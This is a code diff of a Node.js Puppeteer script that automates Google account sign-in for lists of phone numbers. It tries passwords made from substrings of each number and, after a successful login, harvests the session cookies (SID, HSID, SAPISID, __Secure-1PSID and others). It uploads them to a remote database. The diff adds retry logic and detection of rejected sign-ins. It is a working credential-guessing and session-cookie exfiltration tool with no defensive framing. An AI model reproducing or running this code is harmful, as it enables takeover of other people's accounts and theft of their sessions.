@@ -149,98 +149,106 @@ async function startBrowser() {
 }
 
 async function loginNumber() {
-    await page.bringToFront()
-    if (!await exits(page, '#identifierId')) {
-        await page.goto(signIn, { waitUntil: 'load', timeout: 0 })
-        await waitForLoginNext()
-    }
-    mLoginRequest = true
-    LOGIN_RESULT = null
-    await clearInput(page)
-    await page.type('#identifierId', '+'+CODE+mList[SIZE])
-    await delay(500)
-    await page.click('#identifierNext')
-
-    while (true) {
-        await delay(200)
-        if (LOGIN_RESULT != null) {
-            break
+    for (let i = 0; i < 3; i++) {
+        await page.bringToFront()
+        if (!await exits(page, '#identifierId')) {
+            await page.goto(signIn, { waitUntil: 'load', timeout: 0 })
+            await waitForLoginNext()
         }
-    }
+        mLoginRequest = true
+        LOGIN_RESULT = null
+        await clearInput(page)
+        await page.type('#identifierId', '+'+CODE+mList[SIZE])
+        await delay(500)
+        await page.click('#identifierNext')
 
-    if (LOGIN_RESULT.status == 200) {
-        console.log('|0'+ID+'|----'+SIZE+'----|0'+ID+'|')
-        await password.bringToFront()
-        if (!await exits(password, 'input[type="password"]')) {
-            await password.goto('https://accounts.google.com/signin/v2/challenge/pwd?TL='+LOGIN_RESULT.tl+'&checkConnection=youtube%3A225&checkedDomains=youtube&cid='+LOGIN_RESULT.cid+'&continue=https%3A%2F%2Fmyaccount.google.com&ddm=0&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&pstMsg=1&service=accountsettings', { waitUntil: 'load', timeout: 0 })
+        while (true) {
+            await delay(200)
+            if (LOGIN_RESULT != null) {
+                break
+            }
         }
 
-        for (let i = 0; i < PATTERN.length; i++) {
-            PASS_RESULT = null
-            mPassRequest = true
-            let number = ''+CODE+mList[SIZE]
-            let pass = number.substring(PATTERN[i][0], PATTERN[i][1])
+        if (LOGIN_RESULT.status == 200) {
+            console.log('|0'+ID+'|----'+SIZE+'----|0'+ID+'|')
+            await password.bringToFront()
+            if (!await exits(password, 'input[type="password"]')) {
+                await password.goto('https://accounts.google.com/signin/v2/challenge/pwd?TL='+LOGIN_RESULT.tl+'&checkConnection=youtube%3A225&checkedDomains=youtube&cid='+LOGIN_RESULT.cid+'&continue=https%3A%2F%2Fmyaccount.google.com&ddm=0&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&pstMsg=1&service=accountsettings', { waitUntil: 'load', timeout: 0 })
+            }
 
-            await waitForPassword(pass)
+            for (let i = 0; i < PATTERN.length; i++) {
+                PASS_RESULT = null
+                mPassRequest = true
+                let number = ''+CODE+mList[SIZE]
+                let pass = number.substring(PATTERN[i][0], PATTERN[i][1])
 
-            while (true) {
-                await delay(200)
-                if (PASS_RESULT != null) {
-                    break
+                await waitForPassword(pass)
+
+                while (true) {
+                    await delay(200)
+                    if (PASS_RESULT != null) {
+                        break
+                    }
                 }
-            }
 
 
 
-            if (PASS_RESULT.status == 400) {
-                continue
-            } else if(PASS_RESULT.status == 200) {
-                let Cookie = ''
-                try {
-                    let cookies = await page.cookies()
-    
-                    for (let i = 0; i < cookies.length; i++) {
-                        let name = cookies[i]['name']
+                if (PASS_RESULT.status == 400) {
+                    continue
+                } else if(PASS_RESULT.status == 200) {
+                    let Cookie = ''
+                    try {
+                        let cookies = await page.cookies()
+        
+                        for (let i = 0; i < cookies.length; i++) {
+                            let name = cookies[i]['name']
 
-                        if (name == 'APISID' || name == 'HSID' || name == 'LSID' || 
-                                name == 'OSID' || name == 'SID' || name == 'SSID' ||
-                                    name == 'SAPISID' || name == '__Secure-1PSID') {
-                            
-                            Cookie += name+'='+cookies[i]['value']+'; '
+                            if (name == 'APISID' || name == 'HSID' || name == 'LSID' || 
+                                    name == 'OSID' || name == 'SID' || name == 'SSID' ||
+                                        name == 'SAPISID' || name == '__Secure-1PSID') {
+                                
+                                Cookie += name+'='+cookies[i]['value']+'; '
+                            }
                         }
-                    }
-                } catch (error) {}
-                
-                await patchAxios(BASE_URL+'login/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+Cookie+'"}', {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                })
+                    } catch (error) {}
+                    
+                    await patchAxios(BASE_URL+'login/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+Cookie+'"}', {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    })
 
-                SIZE++
+                    SIZE++
 
-                await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ size:SIZE }), {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                })
+                    await patchAxios(BASE_URL+'server/rdp/'+USER+'/'+ID+'.json', JSON.stringify({ size:SIZE }), {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    })
 
-                console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
-                process.exit(0)
-            } else if(PASS_RESULT.status >= 201 && PASS_RESULT.status <= 205){
-                await patchAxios(BASE_URL+'password/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+PASS_RESULT.status+'"}', {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                })
-            } else if(PASS_RESULT.status == 500){
-                await password.goto('about:blank')
-                await page.goto('about:blank')
+                    console.log('|0'+ID+'|----EXIT----|0'+ID+'|')
+                    process.exit(0)
+                } else if(PASS_RESULT.status >= 201 && PASS_RESULT.status <= 205){
+                    await patchAxios(BASE_URL+'password/'+COUNTRY+'/'+mList[SIZE]+'.json', '{"'+pass+'":"'+PASS_RESULT.status+'"}', {
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    })
+                } else if(PASS_RESULT.status == 500){
+                    await password.goto('about:blank')
+                    await page.goto('about:blank')
+                }
+                break
             }
-            break
+        } else if(LOGIN_RESULT.status == 500){
+            await page.goto('about:blank')
         }
-    } else if(LOGIN_RESULT.status == 500){
-        await page.goto('about:blank')
+
+        if(LOGIN_RESULT.status != 500 && LOGIN_RESULT.status != 303){
+            break
+        } else {
+            await delay(10000)
+        }
     }
 
     SIZE++
@@ -334,6 +342,8 @@ async function getLogInRequest(request) {
         return { status:500 }
     } else if (data.includes('/v3/signin/challenge/recaptcha')) {
         return { status:300 }
+    } else if (data.includes('/v3/signin/rejected')) {
+        return { status:303 }
     } else if (!data.includes('V1UmUe')) {
         return { status:500 }
     }
@@ -408,13 +418,11 @@ async function getPassRequest(request, TL, cid) {
         })
     }, TL, body, request.headers())
 
-
     request.respond({
         status: 200,
         contentType: 'application/json; charset=utf-8',
         body: ')]}\'\n\n[[["gf.sicr",null,null,5,null,[null,null,"FIRST_AUTH_FACTOR",1,null,"INCORRECT_ANSWER_ENTERED",1,null,1,6,true,true,null,null,null,null,"","https://lh3.googleusercontent.com/a/default-user",null,null,true,null,[],null,null,null,null,1,null,[],{"1001":[1],"5001":[2]}]],["gf.ttu",false,"'+TL+'"],["e",3,null,null,394]]]',
     })
-
 
     if (data == null) {
         return { status:500 }
